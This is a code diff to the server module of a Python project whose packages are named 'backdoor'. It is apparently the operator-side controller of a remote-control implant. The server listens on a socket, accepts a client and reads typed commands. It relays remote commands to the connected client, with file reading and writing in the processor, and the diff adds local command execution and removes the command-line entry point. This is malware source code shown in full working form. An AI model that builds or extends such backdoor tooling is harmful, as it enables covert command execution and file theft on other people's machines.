@@ -1,22 +1,19 @@
 # pyright: reportUnusedVariable=false
-from argparse import ArgumentParser, Namespace
+from functools import singledispatchmethod
 import socket
 
 from backdoor.command.converter import InputToCommandConverter
+from backdoor.command.executor import LocalCommandExecutor
 from backdoor.command.processor import CommandProcessor
-from backdoor.exceptions.core import PresentableApplicationException
-from backdoor.files.io import FileReader, FileWriter
+from backdoor.exceptions.core import (
+    InvalidArgumentException,
+    PresentableApplicationException,
+)
 from backdoor.messages.exchange.server import ServerExchangeMapper
 from backdoor.messages.messenger import SocketMessenger
-from backdoor.messages.protocol import SocketProtocol
 from backdoor.models.client import ClientModel
-from backdoor.models.commands import Command
-from backdoor.serialization.jsonserializer import JsonSerializer
+from backdoor.models.commands import Command, LocalCommand, RemoteCommand
 from backdoor.utils.errors import print_error
-
-
-DEFAULT_HOST = "0.0.0.0"
-DEFAULT_PORT = 4567
 
 
 class Server:
@@ -27,8 +24,9 @@ class Server:
         exchanger: ServerExchangeMapper,
         converter: InputToCommandConverter,
         processor: CommandProcessor,
-        host: str = DEFAULT_HOST,
-        port: int = DEFAULT_PORT,
+        executor: LocalCommandExecutor,
+        host: str,
+        port: int,
     ) -> None:
         self.host = host
         self.port = port
@@ -36,6 +34,7 @@ class Server:
         self.exchanger = exchanger
         self.converter = converter
         self.processor = processor
+        self.executor = executor
         self.socket = self.__create_socket(host, port)
         self.ps1 = ">>> "
 
@@ -45,15 +44,29 @@ class Server:
 
         while (inp := self.__get_input()) != "exit":
             command = self.converter.convert(inp)
-            self.__perform_command(client, command)
+            self.__perform_command(command, client)
 
-    def __perform_command(self, client: ClientModel, command: Command) -> None:
+    @singledispatchmethod
+    def __perform_command(self, command: Command, client: ClientModel) -> None:
+        cls_name = command.__class__.__qualname__
+        raise InvalidArgumentException(f"Cannot handle base class '{cls_name}'")
+
+    @__perform_command.register
+    def _(self, command: RemoteCommand, client: ClientModel) -> None:
         try:
             self.processor.pre_process(command)
             result = self.exchanger.exchange(client, command)
             self.processor.post_process(command, result)
         except PresentableApplicationException as e:
             print_error(e)
+
+    @__perform_command.register
+    def __(self, command: LocalCommand, client: ClientModel) -> None:
+        result = self.executor.execute(command)
+
+        # TODO: Need a way for post_process to access client and print the info
+
+        self.processor.post_process(command, result)
 
     def __accept_connection(self) -> ClientModel:
         sock, addr = self.socket.accept()
@@ -75,38 +88,3 @@ class Server:
         sock.bind((host, port))
         sock.listen(0)
         return sock
-
-
-def parse_args() -> Namespace:
-    parser = ArgumentParser()
-    parser.add_argument("-a", "--host", required=False, default=DEFAULT_HOST)
-    parser.add_argument("-p", "--port", required=False, default=DEFAULT_PORT, type=int)
-    return parser.parse_args()
-
-
-def main() -> None:
-    args = parse_args()
-
-    protocol = SocketProtocol()
-    serializer = JsonSerializer()
-    converter = InputToCommandConverter()
-    file_writer = FileWriter()
-    file_reader = FileReader()
-
-    messenger = SocketMessenger(protocol, serializer)
-    exchanger = ServerExchangeMapper(messenger)
-    processor = CommandProcessor(file_writer, file_reader)
-
-    server = Server(
-        messenger, exchanger, converter, processor, host=args.host, port=args.port
-    )
-
-    try:
-        print(f"Server running at {args.host}:{args.port}.")
-        server.start()
-    except KeyboardInterrupt:
-        ...
-
-
-if __name__ == "__main__":
-    main()
